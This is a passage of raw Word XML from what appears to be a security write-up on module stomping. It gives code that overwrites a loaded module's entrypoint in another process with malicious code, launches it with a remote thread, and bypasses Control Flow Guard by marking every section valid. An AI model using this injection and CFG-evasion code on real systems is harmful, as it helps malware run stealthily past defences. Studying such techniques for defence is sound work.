        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (moduleToStompBase == </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EA434A" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4124149F" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="003555DB">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>// Get some information from the loaded module, such as its entrypoint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2037EE15" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>moduleInMemory</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> targetModule = </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>moduleInMemory</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(toScanHandle, moduleToStompBase);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB558B3" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74187FED" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="003555DB">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>// Copy our malicious code over the loaded module, starting at the entrypoint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF08A13" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">targetModule.writeToModule(buf, targetModule.entrypoint, </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sizeof</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(buf));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EDF929" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C7C4FEB" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="003555DB">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>// And finally, start a new thread to run the malicious code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5812C2C9" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">targetModule.injectThread(targetModule.entrypoint, </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57799A70" w14:textId="7C0AB8BB" w:rsidR="00967BDA" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7C9D5A" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="104D5CF0" w14:textId="77777777" w:rsidR="00370053" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="00370053">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This code snippet makes use of some functions also available in the Git repo to parse the PE and do some unexciting things such as look up PIDs.</w:t>
      </w:r>
      <w:r w:rsidR="00370053" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D15732" w14:textId="7E18E5B3" w:rsidR="00370053" w:rsidRPr="001E7AD6" w:rsidRDefault="00370053" w:rsidP="00370053">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>One minor hurdle presents itself if the target module has been compiled with the CFG (‘Control Flow Guard’) mitigation, which restricts where code is permitted to branch. If this is enabled, then the injected thread must start at a valid function address, as specified in the original module. Using the module entry</w:t>
      </w:r>
      <w:r w:rsidR="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>point is a convenient way to skirt this requirement, as it is always exposed as a valid function start. However, defeating it is simple (CFG is not designed to protect against this class of attack), so let’s go ahead and do so.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A97CE95" w14:textId="51098874" w:rsidR="00C754FE" w:rsidRPr="001E7AD6" w:rsidRDefault="00C754FE" w:rsidP="00C754FE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Defeating CFG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDD1A4D" w14:textId="6D54D857" w:rsidR="00C754FE" w:rsidRPr="001E7AD6" w:rsidRDefault="00C754FE" w:rsidP="00C754FE">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Control Flow Guard, or CFG, is an exploit mitigation technique intended to make ROP-style exploits more difficult. It works by including a list of valid function addresses</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in every module</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and generating</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>code to verify the target of every call or jump against this list</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> at compile time</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. If an address is not in this list, then the application is halted</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and a security violation is noted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1946AC3B" w14:textId="57442BE5" w:rsidR="00CA67EE" w:rsidRPr="001E7AD6" w:rsidRDefault="00CA67EE" w:rsidP="00385855">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Since we</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>’re</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> overwrit</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the verification code, most of this is irrelevant. However, when Microsoft implemented CFG, it also added checks to a number of API functions – including CreateRemoteThread. Therefore, if we attempt to create our initial thread at a location in the target which did not originally contain a valid function, we will fail this check.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474A0603" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="001E7AD6" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Fortunately, Windows supplies a handy function to modify the list of valid functions. We can just mark everything in the target module as valid:</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD56BDD" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F980820" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (srcSect.Characteristics &amp; </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IMAGE_SCN_MEM_EXECUTE</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067CA3CC" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A4796F" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> n = 0; n &lt; srcSect.VirtualSize; n += 16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED39D99" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>targetModule.markCFGValid(n);</w:t>
      </w:r>
    </w:p>
